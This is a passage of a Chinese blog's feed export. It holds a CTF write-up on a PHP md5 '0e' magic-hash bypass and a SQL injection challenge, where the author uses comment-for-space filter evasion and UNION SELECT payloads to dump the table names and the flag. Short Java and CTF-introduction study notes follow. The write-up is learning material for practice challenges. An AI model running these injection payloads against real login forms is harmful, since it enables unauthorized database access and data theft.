double-quoted-string">"v2 error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"where is flag?"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​                </p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031821505.png"></p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031822954.png"></p><p><strong>根据题目的php代码要求：需要传两个参数v1和v2，v1必须为字母，v2必须为数字，如果两者的MD5值相同，输出flag</strong></p><p>涉及了PHP md5()函数</p><blockquote><p>Php为<strong>弱类型</strong>语言<br>Php中的** == <strong>为</strong>弱类型比较**<br>Md5碰撞利用‘<strong>0e</strong>’开头的<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a><br>Php解释器将e解释为 <strong>科学记数法</strong> 分隔<br>因此只要两段明文的md5秘文以0e开头且长度相同</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php">常用<span class="token constant">MD5</span>绕过值：字母数字混合类（<span class="token constant">MD5</span>值）：s878926199a<span class="token number">0e545993274517709034328855841020</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s214587387a<span class="token number">0e848240448830537924465865611904</span>s214587387a<span class="token number">0e848240448830537924465865611904</span> 大写字母类：<span class="token constant">QLTHNDT</span><span class="token number">0e405967825401955372549139051580</span> <span class="token constant">QNKCDZO</span><span class="token number">0e830400451993494058024219903391</span> <span class="token constant">EEIZDOI</span><span class="token number">0e782601363539291779881938479162</span> 纯数字类：<span class="token number">240610708</span><span class="token number">0e462097431906509019562988736854</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="6-ctf-show-web6"><a href="#6-ctf-show-web6" class="headerlink" title="6.ctf.show_web6"></a>6.ctf.show_web6</h1><p>尝试万能密码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'or 1=1;#其中#为注释符，语句开头的'</span>不能忽略<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>报错，显示sql inject error</p><p>有字符被过滤</p></blockquote><p>此处使用<u>/**/</u>代替空格</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">'<span class="token comment">/**/</span><span class="token keyword">or</span><span class="token comment">/**/</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>登陆成功</p><p>欢迎你，ctfshow    </p></blockquote><p>爆库得到(web2)</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">'<span class="token comment">/**/</span>union<span class="token comment">/**/</span>select<span class="token comment">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>欢迎你，web2    </p></blockquote><p>爆表得到(flag,user)</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">'<span class="token comment">/**/</span>union<span class="token comment">/**/</span>select<span class="token comment">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">/**/</span>from<span class="token comment">/**/</span>information_schema<span class="token operator">.</span>tables<span class="token comment">/**/</span>where<span class="token comment">/**/</span>table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>欢迎你，flag,user    </p></blockquote><p>爆字段得到(flag字段)</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name='</span>flag'<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>欢迎你，flag    </p></blockquote><p>爆字段值得到flag</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">'<span class="token comment">/**/</span>union<span class="token comment">/**/</span>select<span class="token comment">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">/**/</span>from<span class="token comment">/**/</span>flag<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>欢迎你，ctfshow{f086e8a5-ae06-461f-8124-1371e2dc4987}    </p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="https://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>java继承与封装学习</title>
    <link href="https://kannikanyun.github.io/2022/03/27/java%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%B0%81%E8%A3%85%E5%AD%A6%E4%B9%A0/"/>
    <id>https://kannikanyun.github.io/2022/03/27/java%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%B0%81%E8%A3%85%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-03-27T03:40:17.000Z</published>
    <updated>2022-04-03T12:54:35.015Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、继承"><a href="#一、继承" class="headerlink" title="一、继承"></a>一、继承</h1><h2 id="抽象类-方法：abstract关键字修饰"><a href="#抽象类-方法：abstract关键字修饰" class="headerlink" title="抽象类/方法：abstract关键字修饰"></a>抽象类/方法：abstract关键字修饰</h2><p><a href="https://blog.csdn.net/weixin_40096176/article/details/79094991?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164835079316782089352133%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164835079316782089352133&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-2-79094991.142%5Ev5%5Epc_search_result_control_group,143%5Ev6%5Econtrol&utm_term=abstract%E5%85%B3%E9%94%AE%E5%AD%97&spm=1018.2226.3001.4187">java关键字abstract(抽象)详解</a></p><p>简单理解下：abstract关键字修饰的类/方法,只能被 继承、覆写/覆写  后才能实例</p><h2 id="上转型对象"><a href="#上转型对象" class="headerlink" title="上转型对象"></a>上转型对象</h2><p>父类 名称 = new 子类()<br><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032054596.png"></p><h2 id="equals和-的区别"><a href="#equals和-的区别" class="headerlink" title="equals和==的区别"></a>equals和==的区别</h2><p><strong>双等号比较的其实是地址值</strong></p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032054212.png"></p><p>在编译String s1=“song”的时候其实是jvm在常量池中创建了一个内容为”song”的地址值,然后让s1去指向”song”,而不是把”song”直接赋值给s1;</p><p>在编译String s2=“song”的时候常量池中已经有了”song”的地址值,所以让s2直接指向常量池中的”song”，这样s1和s2的地址值都是常量池中”song”的地址值,所以通过双等号的运算结果是true。</p><p><strong>equals比较的是内容是否相同</strong></p><p>然而在第二种情况下执行String s2=new String(“song”)的时候,要记住每new一次就会出现一个新的对象,所以这种情况是直接在堆内存中开辟了一块新的空间去储存”song”,所以此时s1和s2的地址值是不一样的,自然==的结果就为false。</p><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203261825091.png"></p><h1 id="二、private关键字"><a href="#二、private关键字" class="headerlink" title="二、private关键字"></a>二、private关键字</h1><p>父类被子类继承后，其private修饰的属性，只能通过父类的公有方法赋值，也就是说：private修饰属性在构造方法时不必直接赋值，可以在子类继承后通过通过public方法进项赋值</p><h1 id="三、’类’-型的数组"><a href="#三、’类’-型的数组" class="headerlink" title="三、’类’  型的数组"></a>三、’类’  型的数组</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Team</span> <span class="token punctuation">&#123;</span><span class="token comment">// 每次调用表示组队增加一个成员</span> <span class="token class-name">Role</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> mber <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Role</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">int</span> <span class="token class-name">Mber</span> <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//角色上限为6人</span> <span class="token keyword">int</span> sumAttack<span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addMember</span><span class="token punctuation">(</span><span class="token class-name">Role</span> role<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">Mber</span><span class="token operator">&lt;=</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>mber<span class="token punctuation">[</span><span class="token class-name">Mber</span><span class="token punctuation">]</span> <span class="token operator">=</span> role<span class="token punctuation">;</span><span class="token class-name">Mber</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"组队人数超过上限"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">attackSum</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token class-name">Mber</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>sumAttack <span class="token operator">+=</span> mber<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> sumAttack<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><center>此类数组赋值时，方法中向数组传参的值为父类或子类的实例化对象</center>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="JAVA" scheme="https://kannikanyun.github.io/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>CtfhubDay1</title>
    <link href="https://kannikanyun.github.io/2022/03/24/CtfhubDay1/"/>
    <id>https://kannikanyun.github.io/2022/03/24/CtfhubDay1/</id>
    <published>2022-03-24T13:52:12.000Z</published>
    <updated>2022-03-26T13:38:46.730Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CTF基础知识"><a href="#CTF基础知识" class="headerlink" title="CTF基础知识"></a>CTF基础知识</h1><h2 id="比赛形式"><a href="#比赛形式" class="headerlink" title="比赛形式"></a>比赛形式</h2><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>CTF比赛一般分为线上赛和线下赛。通常来说，线上赛多为<code>初赛</code>, 线下赛多为<code>决赛</code>, 但是也不排除直接进行</p><h3 id="线上"><a href="#线上" class="headerlink" title="线上"></a>线上</h3><p>选手通过主办方搭建的比赛平台在线注册，在线做题并提交flag，线上比赛多为解题模式，攻防模式较为少见。通常来说对于长时间未解出的题目，主办方会酌情给出提示(<code>Hint</code>)来帮助选手做题。</p><h3 id="线下"><a href="#线下" class="headerlink" title="线下"></a>线下</h3><p>选手前往比赛所在地，现场接入比赛网络进行比赛，线下多为AWD模式，近年来随着比赛赛制的不断革新，线下赛也会出现多种模式混合进行，例如结合<strong>解题+AWD</strong> ，<strong>解题+RW</strong> 等等   </p><h2 id="题目类型"><a href="#题目类型" class="headerlink" title="题目类型"></a>题目类型</h2><h2 id="正文-1"><a href="#正文-1" class="headerlink" title="正文"></a>正文</h2><p>在CTF中主要包含以下5个大类的题目，有些比赛会根据自己的侧重点单独添加某个分类，例如<code>移动设备(Mobile)</code>, <code>电子取证(Forensics)</code>等，近年来也会出来混合类型的题目，例如在Web中存在一个二进制程序，需要选手先利用Web的漏洞获取到二进制程序，之后通过逆向或是Pwn等方式获得最终flag</p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p>Web类题目大部分情况下和网、Web、HTTP等相关技能有关。主要考察选手对于Web攻防的一些知识技巧。诸如<code>SQL注入</code>、<code>XSS</code>、<code>代码执行</code>、<code>代码审计</code>等等都是很常见的考点。一般情况下Web题目只会给出一个能够访问的URL。部分题目会给出附件</p><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><p>Pwn类题目重点考察选手对于<code>二进制漏洞的挖掘和利用</code>能力，其考点也通常在<code>堆栈溢出</code>、<code>格式化漏洞</code>、<code>UAF</code>、<code>Double Free</code>等常见二进制漏洞上。选手需要根据题目中给出的二进制可执行文件进行逆向分析，找出其中的漏洞并进行利用，编写对应的漏洞攻击脚本(<code>Exploit</code>)，进而对主办方给出的远程服务器进行攻击并获取flag通常来说Pwn类题目给出的远程服务器信息为<code>nc IP_ADDRESS PORT</code>，例如<code>nc 1.2.3.4 4567</code>这种形式，表示在<code>1.2.3.4</code>这个IP的<code>4567</code>端口上运行了该题目</p><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><p>Re类题目考察选手<code>逆向工程</code>能力。题目会给出一个可执行二进制文件，有些时候也可能是Android的APK安装包。选手需要逆向给出的程序，分析其程序工作原理。最终根据程序行为等获得flag</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><p>Crypto类题目考察选手对<code>密码学</code>相关知识的了解程度，诸如<code>RSA</code>、<code>AES</code>、<code>DES</code>等都是密码学题目的常客。有些时候也会给出一个加密脚本和密文，根据加密流程逆推出明文。</p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><p>Misc意为杂项，即不包含在以上分类的题目都会放到这个分类。题目会给出一个附件。选手下载该附件进行分析，最终得出flag</p><p>常见的题型有图片隐写、视频隐写、文档隐写、流量分析、协议分析、游戏、IoT相关等等。五花八门，种类繁多。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="https://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>PHP学习笔记2</title>
    <link href="https://kannikanyun.github.io/2022/03/23/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/"/>
    <id>https://kannikanyun.github.io/2022/03/23/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/</id>
    <published>2022-03-23T13:52:23.000Z</published>
    <updated>2022-03-27T14:18:04.436Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="第三章-流程控制"><a href="#第三章-流程控制" class="headerlink" title="第三章_ 流程控制"></a>第三章_ 流程控制</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="PHP" scheme="https://kannikanyun.github.io/tags/PHP/"/>
    
  </entry>
  
</feed>
